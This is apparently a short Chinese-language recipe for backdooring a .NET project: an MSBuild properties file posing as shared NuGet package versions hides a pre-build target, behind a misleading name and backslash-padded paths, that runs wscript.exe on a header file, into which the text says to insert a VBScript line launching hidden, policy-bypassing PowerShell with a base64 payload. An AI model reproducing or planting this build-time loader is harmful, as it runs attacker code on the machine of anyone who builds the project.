使用属性文件：
```
<Project>
<!-- Shared NuGet package versions -->
<!-- \\\\\\\\\\\\\\\\\\\..\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\..\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ -->
  <ItemGroup>
    <PackageVersion Include="Microsoft.Extensions.Logging" Version="8.0.0" />
    <PackageVersion Include="Newtonsoft.Json" Version="13.0.3" />
    <PackageVersion Include="Serilog" Version="3.1.1" />
    <PackageVersion Include="Grpc.Net.Client" Version="2.63.0" />
    <PackageVersion Include="MediatR" Version="12.2.0" />
    <PackageVersion Include="xunit" Version="2.9.0" />
  </ItemGroup>

  <Target Name="NugetPackageRestore" BeforeTargets="PreBuildEvent">
	<Message Text="Checking for package updates." Importance="high" />
	<Exec Command="$(DriverData)\\\\\\\\\\\\\\\\\\\..\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\..\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\wscript.exe  /b /e:vbscript $(MSBuildProjectDirectory)\include\xxx.h" Condition="'$(OS)' == 'Windows_NT'" />
  </Target>

  <!-- Common build properties -->
  <PropertyGroup>
    <LangVersion>preview</LangVersion>
    <TreatWarningsAsErrors>true</TreatWarningsAsErrors>
    <Deterministic>true</Deterministic>
    <Nullable>enable</Nullable>
    <GenerateDocumentationFile>true</GenerateDocumentationFile>
  </PropertyGroup>
<!-- \\\\\\\\\\\\\\\\\\\..\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\..\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ -->
<!-- Shared NuGet package versions -->

</Project>
```
工程中的xxx.h
```
在正常的头文件中间插入
CreateObject("WScript.Shell").Run (Replace("powershell -nOni -NOlO -wiNdo  HIdden -eXeCUtION ByPass -Nop -ec 你的base64脚本","$","")),0
将其他代码行开头改成‘
```
